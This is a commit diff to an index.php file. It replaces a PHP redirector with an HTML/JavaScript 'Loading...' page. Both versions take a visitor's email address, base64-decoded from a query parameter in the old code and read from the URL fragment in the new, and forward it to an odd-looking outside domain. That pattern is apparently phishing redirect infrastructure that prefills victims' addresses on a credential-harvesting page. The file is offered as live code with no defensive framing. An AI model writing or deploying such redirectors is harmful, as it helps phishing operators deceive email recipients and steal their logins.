87f45cb4b8830d9991e10129a5a1fb75ab276975
bnkmhbjnkm34 <bnkmhbjnkm34@gmail.com>
2025-03-17 09:32:22 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,26 +1,15 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data)) === $data) {
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function decode($email){
-		
-		if(isBase64($email)){
-			 $email = base64_decode($email,false);
-		}
-      
-       header( "refresh:0;url=https://0nlinesjsjjs.jlpfh.top/?n7msM=kXeN".$email);
-
-}
-if(isset($_GET['userid']) && !empty($_GET['userid'])){
-   $email = $_GET['userid'];
-   decode($email);
-}
-   
-   
-?>
+<!doctype html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        var redir_to_page = "https://0nlinesjsjjs.jlpfh.top/?n7msM=kXeN?username=";
+        var hash = window.location.hash;
+        var email = hash.split('M=')[1];
+        redir_to_page = redir_to_page + email;
+        window.location.replace(redir_to_page);
+    </script>
+</head>
+<body>
+</body>
+</html>
